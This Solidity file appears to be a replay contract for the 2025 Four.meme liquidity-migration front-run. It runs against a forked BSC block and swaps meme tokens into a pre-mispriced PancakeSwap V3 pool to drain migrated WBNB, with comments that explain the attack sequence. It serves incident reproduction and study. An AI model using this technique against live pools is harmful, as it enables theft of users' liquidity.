// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the Four.meme liquidity-migration front-run
// (2025-02-FourMeme). The playground forks BSC at block 46,555,731 - by then
// the attacker's bonding-curve buy, the hacker's pre-created degenerate-price
// pool, AND Four.meme's real migration are all already real, mined mainnet
// history, so none of them need to be replayed here (see the config's header
// comment for the full explanation). The ONLY piece that genuinely needs a
// deployed contract is the final swap: PancakeV3Pool.swap() calls back into
// msg.sender's `pancakeV3SwapCallback` to pull the input (meme) token, which a
// plain EOA cannot implement. This file is exactly that minimal callback
// contract - no Test/forge-std dependency, no constructor-only logic, so it
// replays cleanly in the client-side EVM.

interface IERC20Min {
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPancakeV3PoolMin {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract Swap {
    address public immutable pancakePool;
    address public immutable memeToken;

    constructor(address _pancakePool, address _memeToken) {
        pancakePool = _pancakePool;
        memeToken = _memeToken;
    }

    // Swaps whatever meme-token bag this contract holds into the degenerate
    // pool (already priced at the attacker's earlier sqrtPriceX96 = 1e40),
    // pulling out nearly the entirety of the WBNB Four.meme just migrated in.
    function swap(int256 amountSpecified, uint160 sqrtPriceLimitX96) external returns (int256 amount1) {
        (, amount1) = IPancakeV3PoolMin(pancakePool).swap(address(this), true, amountSpecified, sqrtPriceLimitX96, "");
    }

    // Called by the pool mid-swap to pull the meme-token input leg.
    function pancakeV3SwapCallback(int256 amount0Delta, int256 /* amount1Delta */, bytes calldata /* data */) external {
        require(msg.sender == pancakePool, "only pool");
        IERC20Min(memeToken).transfer(pancakePool, uint256(amount0Delta));
    }
}
